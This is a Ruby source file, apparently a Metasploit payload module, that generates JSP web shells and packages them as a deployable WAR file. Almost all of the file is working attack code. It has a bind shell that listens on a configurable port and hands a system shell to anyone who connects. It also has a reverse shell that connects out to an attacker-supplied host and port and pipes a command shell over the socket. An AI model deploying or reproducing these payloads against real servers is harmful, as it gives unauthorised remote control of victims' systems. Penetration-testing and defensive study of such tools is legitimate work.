# -*- coding: binary -*-
require 'msf/core'
require 'rex'

module Msf::Payload::JSP
  # Outputs jsp that spawns a bind TCP shell
  # @return [String] jsp code that executes bind TCP payload
  def jsp_bind_tcp
    # Modified from: http://www.security.org.sg/code/jspreverse.html
    jsp = <<-EOS
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream is;
    OutputStream os;

    StreamConnector( InputStream is, OutputStream os )
    {
      this.is = is;
      this.os = os;
    }

    public void run()
    {
      BufferedReader in  = null;
      BufferedWriter out = null;
      try
      {
        in  = new BufferedReader( new InputStreamReader( this.is ) );
        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
        {
          out.write( buffer, 0, length );
          out.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( in != null )
          in.close();
        if( out != null )
          out.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    ServerSocket server_socket = new ServerSocket( #{datastore['LPORT'].to_s} );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( "#{datastore['SHELL']}" );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
    EOS

    return jsp
  end

  # Outputs jsp code that spawns a reverse TCP shell
  # @return [String] jsp code that executes reverse TCP payload
  def jsp_reverse_tcp
    # JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
    jsp = <<-EOS
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream is;
    OutputStream os;

    StreamConnector( InputStream is, OutputStream os )
    {
      this.is = is;
      this.os = os;
    }

    public void run()
    {
      BufferedReader in  = null;
      BufferedWriter out = null;
      try
      {
        in  = new BufferedReader( new InputStreamReader( this.is ) );
        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
        {
          out.write( buffer, 0, length );
          out.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( in != null )
          in.close();
        if( out != null )
          out.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    Socket socket = new Socket( "#{datastore['LHOST']}", #{datastore['LPORT'].to_s} );
    Process process = Runtime.getRuntime().exec( "#{datastore['SHELL']}" );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
    EOS
    return jsp
  end

  # Wraps the jsp payload into a war
  # @return [Rex::Zip::War] a war to execute the jsp payload
  def generate_war
    war = Rex::Zip::War.new({:jsp => generate})
    war.build_manifest
  end

end

